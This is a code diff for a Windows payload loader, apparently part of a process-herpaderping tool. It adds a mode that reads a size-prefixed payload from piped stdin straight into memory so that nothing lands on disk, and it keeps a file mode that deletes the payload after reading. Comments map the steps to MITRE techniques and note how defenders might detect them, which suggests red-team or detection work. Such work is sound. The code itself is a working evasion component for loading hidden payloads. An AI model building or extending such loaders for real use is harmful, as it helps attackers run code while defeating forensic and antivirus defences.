@@ -50,28 +50,82 @@ static HANDLE GetNonJobParent()
 	return GetCurrentProcess();
 }
 
+// GetPayloadBuffer: supports two modes for T1620 Reflective Code Loading
+// Mode 1 (STDIN): read payload from stdin with 4-byte size header (NO disk artifact)
+//   - Detection: node.exe spawns CertEnrollAgent.exe with stdin redirection
+//   - Flow: stdin → VirtualAlloc → ReadFile(stdin) → Herpaderping
+// Mode 2 (FILE): fallback to legacy file-based loading (for testing)
+//   - Detection: CreateFileW → ReadFile → DeleteFileW (T1070.004)
 BYTE *GetPayloadBuffer(OUT size_t &p_size)
 {
+	HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
+	DWORD stdinType = GetFileType(hStdin);
+	
+	// Mode 1: STDIN redirection (T1620 - Reflective Code Loading)
+	// Check if stdin is redirected (FILE type instead of CHAR device)
+	if (hStdin != INVALID_HANDLE_VALUE && stdinType == FILE_TYPE_PIPE)
+	{
+		// Read 4-byte size header (little-endian DWORD)
+		DWORD payloadSize = 0;
+		DWORD bytesRead = 0;
+		if (!ReadFile(hStdin, &payloadSize, sizeof(DWORD), &bytesRead, NULL) || bytesRead != sizeof(DWORD))
+		{
+			perror("[-] Failed to read payload size from stdin\n");
+			exit(-1);
+		}
+		
+		// Validate size (sanity check: 1KB - 50MB range)
+		if (payloadSize < 1024 || payloadSize > 50 * 1024 * 1024)
+		{
+			perror("[-] Invalid payload size from stdin\n");
+			exit(-1);
+		}
+		
+		// Allocate RW buffer for payload
+		BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		if (bufferAddress == NULL)
+		{
+			perror("[-] Failed to allocate memory for stdin payload buffer\n");
+			exit(-1);
+		}
+		
+		// Read payload bytes from stdin
+		bytesRead = 0;
+		if (!ReadFile(hStdin, bufferAddress, payloadSize, &bytesRead, NULL) || bytesRead != payloadSize)
+		{
+			perror("[-] Failed to read payload from stdin\n");
+			VirtualFree(bufferAddress, 0, MEM_RELEASE);
+			exit(-1);
+		}
+		
+		p_size = payloadSize;
+		// NO DeleteFileW — payload never touched disk (T1620)
+		return bufferAddress;
+	}
+	
+	// Mode 2: FILE-based loading (legacy fallback)
+	// Used for testing or when stdin not available
 	HANDLE hFile = CreateFileW(PAYLOAD_PATH, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
+		perror("[-] Failed to open payload file (no stdin and no file found)\n");
 		return NULL;
 	}
 	p_size = GetFileSize(hFile, NULL);
 	BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (bufferAddress == NULL)
 	{
-		perror("[-] Failed to allocate memory for payload buffer.. \n");
+		perror("[-] Failed to allocate memory for payload buffer\n");
 		exit(-1);
 	}
 	DWORD bytesRead = 0;
 	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL))
 	{
-		perror("[-] Failed to read payload buffer... \n");
+		perror("[-] Failed to read payload buffer from file\n");
 		exit(-1);
 	}
 	CloseHandle(hFile);
-	DeleteFileW(PAYLOAD_PATH);
+	DeleteFileW(PAYLOAD_PATH);  // T1070.004 - only in file mode
 	return bufferAddress;
 }
 
